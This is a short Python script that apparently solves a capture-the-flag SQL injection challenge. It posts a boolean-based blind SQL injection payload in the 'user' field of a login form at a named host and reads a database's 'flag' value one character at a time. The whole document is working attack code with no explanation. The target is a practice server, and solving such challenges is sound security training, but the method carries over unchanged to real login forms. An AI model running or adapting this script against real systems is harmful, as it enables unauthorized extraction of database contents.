import requests
dict="qazwsxedcrfvtgbyhnujmikolp123456789{}-"
url="http://mashang.eicp.vip:1650/api/yucctf/sqli_4/sql2.php"
flag=""
for i in range(1,100):
    for s in dict:
     payload = "1' or if(substr((select flag from message.flag ),%d,1)=\"%s\",1,0)-- "%(i,s)
     data = {"user":payload,"passwd":"1"}
     r=requests.post(url,data=data)
     if 'successful' in r.text:
         flag+=s
         print(flag)
